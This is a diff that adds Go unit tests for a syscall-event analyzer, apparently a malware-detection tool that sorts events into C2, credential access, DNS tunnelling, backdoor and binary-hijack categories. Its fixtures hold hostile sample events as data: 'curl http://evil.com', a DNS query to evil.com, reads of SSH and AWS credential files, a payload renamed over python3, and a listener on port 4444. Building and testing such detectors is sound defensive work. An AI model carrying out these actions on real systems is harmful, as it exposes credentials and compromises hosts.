@@ -1,10 +1,18 @@
 package analyzer
 
 import (
+	"strings"
 	"testing"
 	"time"
 
 	"github.com/RalianENG/kojuto/internal/types"
+)
+
+const (
+	riskCritical = "critical"
+	riskHigh     = "high"
+	riskMedium   = "medium"
+	riskNone     = "none"
 )
 
 func TestAnalyze_Clean(t *testing.T) {
@@ -363,5 +371,274 @@ func TestAnalyze_SedExcluded(t *testing.T) {
 	verdict, _ := Analyze(events)
 	if verdict != types.VerdictSuspicious {
 		t.Errorf("expected suspicious for sed, got %s", verdict)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// GenerateSummary
+// ---------------------------------------------------------------------------
+
+func TestGenerateSummary_Clean(t *testing.T) {
+	s := GenerateSummary(types.VerdictClean, nil)
+	if s.RiskLevel != riskNone {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskNone)
+	}
+	if s.Description == "" {
+		t.Error("expected non-empty description for clean verdict")
+	}
+}
+
+func TestGenerateSummary_Inconclusive(t *testing.T) {
+	s := GenerateSummary(types.VerdictInconclusive, nil)
+	if s.RiskLevel != riskMedium {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskMedium)
+	}
+	if s.Remediation == "" {
+		t.Error("expected non-empty remediation for inconclusive verdict")
+	}
+}
+
+func TestGenerateSummary_C2(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Category: types.CategoryC2},
+	}
+	s := GenerateSummary(types.VerdictSuspicious, events)
+	if s.RiskLevel != riskCritical {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
+	}
+	found := false
+	for _, c := range s.Categories {
+		if c == types.CategoryC2 {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected categories to include %q, got %v", types.CategoryC2, s.Categories)
+	}
+}
+
+func TestGenerateSummary_CredentialAccess(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", Category: types.CategoryCredentialAccess},
+	}
+	s := GenerateSummary(types.VerdictSuspicious, events)
+	if s.RiskLevel != riskCritical {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
+	}
+	if !strings.Contains(s.Remediation, "rotate") {
+		t.Errorf("remediation should mention 'rotate', got %q", s.Remediation)
+	}
+}
+
+func TestGenerateSummary_CodeExecutionOnly(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com", Category: types.CategoryCodeExecution},
+	}
+	s := GenerateSummary(types.VerdictSuspicious, events)
+	if s.RiskLevel != riskMedium {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskMedium)
+	}
+}
+
+func TestGenerateSummary_BinaryHijack(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: "/usr/local/bin/python3", Category: types.CategoryBinaryHijack},
+	}
+	s := GenerateSummary(types.VerdictSuspicious, events)
+	if s.RiskLevel != riskHigh {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// classify (tested through Analyze)
+// ---------------------------------------------------------------------------
+
+func TestClassify_Connect(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Family: 2},
+	}
+	_, filtered := Analyze(events)
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryC2 {
+		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryC2)
+	}
+}
+
+func TestClassify_SendtoWithDNS(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventSendto, DstAddr: "8.8.8.8", DstPort: 53, Family: 2,
+			DNSQuery: "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil.com"},
+	}
+	_, filtered := Analyze(events)
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryDNSTunnel {
+		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSTunnel)
+	}
+}
+
+func TestClassify_SendtoWithoutDNS(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventSendto, DstAddr: "203.0.113.50", DstPort: 8080, Family: 2},
+	}
+	_, filtered := Analyze(events)
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryC2 {
+		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryC2)
+	}
+}
+
+func TestClassify_Openat(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventOpenat, FilePath: "/home/dev/.aws/credentials", OpenFlags: "O_RDONLY"},
+	}
+	_, filtered := Analyze(events)
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryCredentialAccess {
+		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCredentialAccess)
+	}
+}
+
+func TestClassify_Rename(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: "/usr/local/bin/python3"},
+	}
+	_, filtered := Analyze(events)
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryBinaryHijack {
+		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryBinaryHijack)
+	}
+}
+
+func TestClassify_BindListenAccept(t *testing.T) {
+	for _, syscall := range []string{types.EventBind, types.EventListen, types.EventAccept} {
+		t.Run(syscall, func(t *testing.T) {
+			events := []types.SyscallEvent{
+				{Syscall: syscall, DstAddr: "0.0.0.0", DstPort: 4444},
+			}
+			_, filtered := Analyze(events)
+			if len(filtered) != 1 {
+				t.Fatalf("expected 1 event for %s, got %d", syscall, len(filtered))
+			}
+			if filtered[0].Category != types.CategoryBackdoor {
+				t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryBackdoor)
+			}
+		})
+	}
+}
+
+func TestClassify_ExecvePythonC(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 -c import os; os.system('id')"},
+	}
+	_, filtered := Analyze(events)
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryCodeExecution {
+		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCodeExecution)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// portStr
+// ---------------------------------------------------------------------------
+
+func TestPortStr(t *testing.T) {
+	if got := portStr(0); got != "?" {
+		t.Errorf("portStr(0) = %q, want %q", got, "?")
+	}
+	if got := portStr(443); got != "443" {
+		t.Errorf("portStr(443) = %q, want %q", got, "443")
+	}
+}
+
+// ---------------------------------------------------------------------------
+// truncate
+// ---------------------------------------------------------------------------
+
+func TestTruncate(t *testing.T) {
+	short := "hello"
+	if got := truncate(short, 10); got != "hello" {
+		t.Errorf("truncate(%q, 10) = %q, want %q", short, got, "hello")
+	}
+
+	long := "abcdefghij"
+	if got := truncate(long, 5); got != "abcde..." {
+		t.Errorf("truncate(%q, 5) = %q, want %q", long, got, "abcde...")
+	}
+
+	exact := "abcde"
+	if got := truncate(exact, 5); got != "abcde" {
+		t.Errorf("truncate(%q, 5) = %q, want %q", exact, got, "abcde")
+	}
+}
+
+func TestHasAllowedDir(t *testing.T) {
+	allowed := []string{"/usr/bin/", "/usr/local/bin/", "/bin/"}
+	for _, d := range allowed {
+		if !hasAllowedDir(d) {
+			t.Errorf("hasAllowedDir(%q) = false, want true", d)
+		}
+	}
+	disallowed := []string{"/tmp/", "/sbin/", "/home/dev/", ""}
+	for _, d := range disallowed {
+		if hasAllowedDir(d) {
+			t.Errorf("hasAllowedDir(%q) = true, want false", d)
+		}
+	}
+}
+
+func TestAnalyze_ClassifiesReasonField(t *testing.T) {
+	// Verify that Analyze populates Reason field on suspicious events.
+	events := []types.SyscallEvent{
+		{Syscall: types.EventConnect, DstAddr: "1.2.3.4", DstPort: 443, Family: 2},
+	}
+	_, filtered := Analyze(events)
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event, got %d", len(filtered))
+	}
+	if filtered[0].Reason == "" {
+		t.Error("expected non-empty Reason after Analyze")
+	}
+}
+
+func TestGenerateSummary_DNSTunnel(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventSendto, Category: types.CategoryDNSTunnel},
+	}
+	s := GenerateSummary(types.VerdictSuspicious, events)
+	if s.RiskLevel != riskHigh {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
+	}
+}
+
+func TestGenerateSummary_Backdoor(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventBind, Category: types.CategoryBackdoor},
+	}
+	s := GenerateSummary(types.VerdictSuspicious, events)
+	if s.RiskLevel != riskCritical {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
+	}
+}
+
+func TestGenerateSummary_DataExfil(t *testing.T) {
+	events := []types.SyscallEvent{
+		{Syscall: types.EventSendto, Category: types.CategoryDataExfil},
+	}
+	s := GenerateSummary(types.VerdictSuspicious, events)
+	if s.RiskLevel != riskCritical {
+		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
 	}
 }
